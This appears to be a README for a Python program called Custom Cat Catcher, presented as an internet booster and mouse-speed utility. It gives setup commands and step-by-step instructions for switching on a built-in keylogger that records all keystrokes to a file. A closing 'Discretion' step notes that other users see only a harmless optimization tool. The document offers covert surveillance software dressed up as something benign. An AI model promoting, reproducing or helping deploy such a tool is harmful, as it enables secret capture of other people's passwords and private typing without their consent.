# CUSTOM CAT CATCHER PE v9.2
A Compact Internet Booster, Mouse Speed & Small Keylogger Utility

# How to Download & Run
1. Download: Download the project as a ZIP file from the GitHub repository.
2. Execute: Open the dist folder and locate the .exe file.
3. Run: Double-click the executable to start the application.
4. Troubleshooting: If you encounter errors such as "STDN missing" or other startup issues, please follow the VS Code setup instructions below.

# Running via VS Code (Development Mode)
If the executable fails to run, you can launch the application directly using Python:
1. Setup: Open VS Code and ensure the Python extension is installed.
2. Import: Open the uncompressed "Custom Cat Catcher" folder in VS Code.
3. Terminal: Open a new terminal window within VS Code.
# Environment: Create a virtual environment by typing:
python -m venv venv
# Activation: Activate the virtual environment:
venv\Scripts\Activate
# Dependencies: Install the required libraries:
pip install pynput psutil speedtest-cli
# Updates: Ensure your package manager is up to date:
python.exe -m pip install --upgrade pip
# Launch: Start the application by typing:
python cat.py
# Operating the Keylogger
1. File Creation: Create a new text file named keylog.txt.
2. Setup: Copy or cut the file.
3. Directory: Navigate to C:\Program Files on your C: drive.
4. Permissions: Paste the file there, granting Administrator permission when prompted.
5. Detection: In the Custom Cat Catcher application, click Scan File.
6. Activation: If the file is detected in your Program Files, the keylogger will automatically activate.
7. Logging: Once active, the program will record all keystrokes to the keylog.txt file. You can open this file at any time to review the recorded data.
8. Discretion: To other users, the application appears to be a harmless, small-scale internet optimization tool.
